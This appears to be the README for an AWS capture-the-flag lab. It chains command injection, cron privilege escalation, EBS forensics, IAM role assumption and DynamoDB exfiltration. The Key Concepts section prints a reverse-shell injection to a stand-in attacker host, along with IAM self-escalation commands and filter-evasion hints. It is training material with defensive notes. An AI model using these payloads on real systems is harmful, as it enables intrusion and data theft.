# Cogitator Exploit Lab

**Difficulty:** 6  
**Time:** 90-120 minutes  
**Prerequisites:** Linux command line, AWS CLI, Python reverse shells, IAM concepts

## Scenario

You've discovered a network diagnostic web application running on a target EC2 instance. The application provides ping, traceroute, DNS lookup, and port scanning functionality. Your objective is to exploit this service, escalate privileges, and exfiltrate sensitive data stored in AWS services.

The target organization uses a tiered IAM architecture with separate roles for different privilege levels. Multiple flags are hidden throughout the infrastructure representing different stages of compromise.

## Objectives

1. Gain initial access through web application exploitation
2. Establish persistent access on the target system
3. Escalate privileges to root
4. Discover and access detached storage volumes
5. Enumerate and assume secondary IAM roles
6. Perform IAM-based privilege escalation
7. Exfiltrate data from DynamoDB
8. Capture all three flags


Access the web application at `http://[instance-ip]:8081`

## Flags

Three flags are hidden throughout the infrastructure:
- **Flag 1:** S3 bucket enumeration
- **Flag 2:** EBS volume forensics
- **Flag 3:** DynamoDB data exfiltration

Each flag follows the format: `FLAG{description_of_achievement}`

## Enumeration Checklist

### Phase 1: Web Application
- What functionality does the application provide?
- How are user inputs processed?
- What server-side technologies are in use?
- Are inputs properly sanitized?

### Phase 2: Initial Compromise
- What command injection techniques bypass input validation?
- How can you establish a reverse shell?
- What user context are you running under?
- What permissions does the compromised user have?

### Phase 3: Privilege Escalation
- What scheduled tasks are running on the system?
- Which files can the current user modify?
- What processes run with elevated privileges?
- How can you leverage cron jobs for escalation?

### Phase 4: Cloud Enumeration
- What IAM role is attached to the instance?
- What permissions does the instance profile have?
- Are there detached EBS volumes?
- What other AWS resources are accessible?

### Phase 5: Data Discovery
- What information is stored on detached volumes?
- What additional IAM roles are referenced?
- What are the trust relationships between roles?
- What hints are provided about escalation paths?

### Phase 6: IAM Privilege Escalation
- How do you assume a secondary IAM role?
- What permissions does the assumed role have?
- Can the role modify its own policies?
- What AWS managed policies provide database access?

### Phase 7: Data Exfiltration
- What DynamoDB tables exist in the account?
- How do you scan table contents programmatically?
- What data classification levels exist?
- Where is the final flag located?

## Key Concepts

### Command Injection
Python's `subprocess.check_output()` with `shell=True` allows command chaining:
```bash
# Basic injection
8.8.8.8; whoami

# Reverse shell injection
8.8.8.8; bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
```

### IAM Role Assumption
```bash
# Assume role
aws sts assume-role \
  --role-arn arn:aws:iam::[account]:role/[role-name] \
  --role-session-name exploit-session

# Export temporary credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

### EBS Volume Operations
```bash
# List volumes
aws ec2 describe-volumes

# Attach volume
aws ec2 attach-volume \
  --volume-id vol-xxx \
  --instance-id i-xxx \
  --device /dev/sdf

# Mount volume
sudo mount /dev/xvdf /mnt/evidence
```

### Policy Attachment for Escalation
```bash
# List available policies
aws iam list-policies --scope AWS | grep -i dynamodb

# Attach policy to role
aws iam attach-role-policy \
  --role-name [role-name] \
  --policy-arn arn:aws:iam::aws:policy/AmazonDynamoDBReadOnlyAccess
```

### DynamoDB Scanning
```bash
# List tables
aws dynamodb list-tables

# Scan table
aws dynamodb scan --table-name [table-name]

# Scan with filtering
aws dynamodb scan \
  --table-name [table-name] \
  --filter-expression "Type = :type" \
  --expression-attribute-values '{":type":{"S":"HTB"}}'
```

## Attack Chain Hints

### Getting a Shell
If direct reverse shells fail, try:
- Base64 encoding the payload
- Using Python one-liners
- Breaking the payload into multiple stages
- URL encoding special characters

### Finding Credentials
Look for:
- Application log files
- EC2 metadata service (IMDSv1 enabled)
- Environment variables
- Configuration files

### Privilege Escalation
Consider:
- User-writable scripts executed by root
- Cron jobs with poor file permissions
- SUID binaries (less common in this scenario)

### IAM Navigation
Remember:
- Instance profiles provide initial credentials
- AssumeRole requires explicit trust policies
- Roles can often modify their own policies
- AWS managed policies are pre-configured

## Defensive Considerations

After completing the lab, consider:
- How would you detect command injection attempts?
- What logging would reveal privilege escalation?
- How can you prevent IAM role assumption abuse?
- What CloudTrail events indicate suspicious activity?
- How should cron jobs be configured securely?
- Why is logging credentials always dangerous?

## Common Issues

**Reverse shell not connecting:**
- Verify listener is running before payload execution
- Check firewall rules on attacker machine
- Ensure payload syntax is correct
- Try alternative shell techniques

**Cannot mount EBS volume:**
- Confirm you have root privileges
- Check volume is in same availability zone
- Verify device name matches attached device
- Use `lsblk` to identify correct device

**AssumeRole fails:**
- Verify trust policy allows your principal
- Check role ARN is correct
- Ensure session name follows naming rules
- Confirm primary role has sts:AssumeRole permission

**DynamoDB access denied:**
- Verify you're using assumed role credentials
- Check if additional policies are needed
- Remember to attach DynamoDB policy to role
- Confirm table name is correct

## Cleanup

```bash
terraform destroy -var="ssh_key_name=your-key" -var='allowed_source_ips=["YOUR_IP/32"]'
```

## Learning Outcomes

**Technical Skills:**
- Web application exploitation (command injection)
- Linux privilege escalation via cron
- AWS IAM role assumption mechanics
- EC2 instance metadata service abuse
- EBS volume forensics
- IAM policy-based privilege escalation
- DynamoDB CLI operations

**Cloud Security Concepts:**
- Defense in depth across multiple services
- IAM least privilege principle
- Trust boundaries between roles
- Credential exposure risks
- Cloud-native attack chains

**Defensive Lessons:**
- Input sanitization best practices
- Secure cron job configuration
- IMDSv2 migration importance
- IAM permission boundary implementation
- CloudTrail monitoring for suspicious activity
- Proper credential handling in applications